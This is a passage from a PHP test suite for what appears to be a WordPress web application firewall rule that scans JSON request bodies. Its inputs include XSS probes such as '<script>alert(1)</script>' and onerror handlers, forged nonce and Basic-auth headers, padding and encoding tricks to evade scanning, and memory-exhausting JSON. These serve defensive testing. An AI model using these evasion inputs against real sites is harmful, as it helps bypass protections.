				)
			);
		};
		$this->assertNull( $this->rule()->inspect( $make( 'POST', array( 'CONTENT_LENGTH' => '0' ) ) ) );
		$this->assertNull( $this->rule()->inspect( $make( 'GET', array() ) ) );
		$this->assertNull( $this->rule()->inspect( $make( 'HEAD', array( 'CONTENT_LENGTH' => '5' ) ) ) );
		$this->assertSame( 0, $reads );
		// A GET that declares a chunked body is still sniffed.
		$this->assertNotNull( $this->rule()->inspect( $make( 'GET', array( 'HTTP_TRANSFER_ENCODING' => 'chunked' ) ) ) );
	}

	public function test_basic_editor_credentials_exempt_without_a_nonce(): void {
		$body = array( 'content' => '<iframe src="x"></iframe>' );
		$this->assertNull( $this->rule()->inspect( $this->json_request( $body, 'application/json', array(), array( 'basic_editor' => true ) ) ) );
		// Not an editor (or wrong password): scanned.
		$this->assertNotNull( $this->rule()->inspect( $this->json_request( $body, 'application/json', array(), array( 'basic_editor' => false ) ) ) );
		// A forged Basic header alone changes nothing: the resolver decides, not the header.
		$this->assertNotNull( $this->rule()->inspect( $this->json_request( $body, 'application/json', array( 'HTTP_AUTHORIZATION' => 'Basic dTpw', 'PHP_AUTH_USER' => 'u' ), array( 'query' => array( 'rest_route' => '/x' ) ) ) ) );
		$this->assertNotNull( $this->rule()->inspect( $this->json_request( $body, 'application/json', array( 'HTTP_AUTHORIZATION' => 'Basic dTpw' ), array( 'uri' => '/wp-admin/admin-ajax.php?rest_route=/x' ) ) ) );
	}

	public function test_rest_nonce_is_verified_on_rest_paths_only(): void {
		$body  = array( 'content' => '<iframe src="x"></iframe>' );
		$nonce = array( 'HTTP_X_WP_NONCE' => 'forged' );
		$rest  = array(
			'editor' => true,
			'query'  => array( 'rest_route' => '/wp/v2/posts' ),
		);
		$this->assertNotNull( $this->rule()->inspect( $this->json_request( $body, 'application/json', $nonce, $rest + array( 'nonce_ok' => false ) ) ), 'forged nonce on a REST path' );
		$this->assertNull( $this->rule()->inspect( $this->json_request( $body, 'application/json', $nonce, $rest + array( 'nonce_ok' => true ) ) ) );
		// Off the REST API, presence is enough.
		$this->assertNull( $this->rule()->inspect( $this->json_request( $body, 'application/json', $nonce, array( 'editor' => true, 'nonce_ok' => false ) ) ) );
	}

	public function test_leading_blanks_do_not_hide_a_sniffed_body(): void {
		$payload = '{"a":"<script>alert(1)</script>"}';
		foreach ( array( 100, 300, 5000, 70000 ) as $blanks ) {
			$body = str_repeat( " \t\r\n", (int) ( $blanks / 4 ) ) . $payload;
			$req  = $this->json_request( $body, 'text/plain', array( 'CONTENT_LENGTH' => (string) strlen( $body ) ) );
			$this->assertNotNull( $this->rule()->inspect( $req ), "{$blanks} blanks" );
		}
		// Blanks to the limit and beyond: refused as too large.
		$body = str_repeat( ' ', 1048577 ) . $payload;
		$req  = $this->json_request( $body, 'text/plain', array(), array( 'logged_in' => false ) );
		$this->assertNotNull( $this->rule()->inspect( $req ) );
		// Only blanks: nothing to scan.
		$this->assertNull( $this->rule()->inspect( $this->json_request( str_repeat( ' ', 5000 ), 'text/plain' ) ) );
	}

	public function test_urlencoded_body_that_is_really_json_is_sniffed(): void {
		$req = $this->json_request( '{"a":"<script>alert(1)</script>"}', 'application/x-www-form-urlencoded', array( 'CONTENT_LENGTH' => '40' ) );
		$this->assertNotNull( $this->rule()->inspect( $req ) );
		$req = $this->json_request( 'a=1&b=2', 'application/x-www-form-urlencoded', array( 'CONTENT_LENGTH' => '7' ) );
		$this->assertNull( $this->rule()->inspect( $req ) );
	}

	public function test_invalid_utf8_json_is_scanned_after_dropping_bad_bytes(): void {
		$raw = "{\"a\":\"\xff<script>alert(1)</script>\"}";
		$this->assertNotNull( $this->rule()->inspect( $this->json_request( $raw ) ) );
		$this->assertNull( $this->rule()->inspect( $this->json_request( "{\"a\":\"\xff fine\"}" ) ) );
	}

	public function test_top_level_json_string_is_scanned(): void {
		$this->assertNotNull( $this->rule()->inspect( $this->json_request( '"<script>alert(1)</script>"' ) ) );
		$this->assertNull( $this->rule()->inspect( $this->json_request( '"hello"' ) ) );
		$this->assertNull( $this->rule()->inspect( $this->json_request( '42' ) ) );
	}

	public function test_many_commas_raise_the_memory_estimate(): void {
		if ( memory_get_usage() > 40 * 1048576 ) {
			$this->markTestSkipped( 'Too much memory in use to lower the limit safely.' );
		}
		$old  = ini_get( 'memory_limit' );
		$body = '[' . str_repeat( '1,', 3000000 ) . '1]'; // 6 MB of scalars, no inner brackets.
		$req  = $this->json_request( $body );
		ini_set( 'memory_limit', '64M' ); // phpcs:ignore WordPress.PHP.IniSet
		try {
			$v = $this->rule()->inspect( $req );
		} finally {
			ini_set( 'memory_limit', (string) $old ); // phpcs:ignore WordPress.PHP.IniSet
		}
		$this->assertNotNull( $v );
	}

	public function test_payload_deep_inside_a_large_json_value_is_found(): void {
		$raw = json_encode( array( 'content' => str_repeat( 'a', 150000 ) . '<script>alert(1)</script>' . str_repeat( 'b', 150000 ) ) );
		$this->assertNotNull( $this->rule()->inspect( $this->json_request( $raw ) ) );
		// Forms keep the cheaper bounded scan.
		$value = str_repeat( 'a', 150000 ) . '<script>alert(1)</script>' . str_repeat( 'b', 150000 );
		$this->assertNull( WafRule::match_value( $value, WafRule::SIGNATURES ) );
		$this->assertNotNull( WafRule::match_value( $value, WafRule::SIGNATURES, true ) );
	}

	public function test_event_handler_deep_inside_a_large_json_value_is_found(): void {
		$raw = json_encode( array( 'c' => '<img ' . str_repeat( 'a', 150000 ) . ' onerror=alert(1)>' ) );
		$this->assertNotNull( $this->rule()->inspect( $this->json_request( $raw ) ) );
	}

	public function test_hostile_one_megabyte_json_stays_within_memory(): void {
		$bodies = array(
			'wide'      => '{' . implode( ',', array_map( static fn( $i ) => '"k' . $i . '":1', range( 1, 100000 ) ) ) . '}',
			'long keys' => str_repeat( '{"' . str_repeat( 'k', 1000 ) . '":', 450 ) . '"x"' . str_repeat( '}', 450 ),
			'deep fan'  => str_repeat( '[', 400 ) . implode( ',', array_fill( 0, 200000, '1' ) ) . str_repeat( ']', 400 ),
			'arrays'    => '[' . implode( ',', array_fill( 0, 250000, '[1]' ) ) . ']',
			'objects'   => '[' . implode( ',', array_fill( 0, 120000, '{"a":1}' ) ) . ']',
		);
		foreach ( $bodies as $name => $body ) {
			$this->assertLessThan( 1100000, strlen( $body ), $name );
			$req = $this->json_request( $body );
			$req->body_limited( 8388608 ); // Load it first, so the baseline holds the body.
			memory_reset_peak_usage();
			$base = memory_get_usage();
			$this->rule()->inspect( $req );
			$this->assertLessThan( 64 * 1048576, memory_get_peak_usage() - $base, $name );
		}
	}

	public function test_body_that_could_exhaust_memory_on_decode_is_blocked(): void {
		$old = ini_get( 'memory_limit' );
		if ( memory_get_usage() > 40 * 1048576 ) {
			$this->markTestSkipped( 'Too much memory in use to lower the limit safely.' );
		}
		$body = '[' . implode( ',', array_fill( 0, 1000000, '[1]' ) ) . ']'; // 4 MB.
		$req  = $this->json_request( $body );
		ini_set( 'memory_limit', '128M' ); // phpcs:ignore WordPress.PHP.IniSet
		try {
			$v = $this->rule()->inspect( $req );
		} finally {
			ini_set( 'memory_limit', (string) $old ); // phpcs:ignore WordPress.PHP.IniSet
		}
		$this->assertNotNull( $v );
		$this->assertStringContainsString( 'too large', $v->reason() );
	}
}
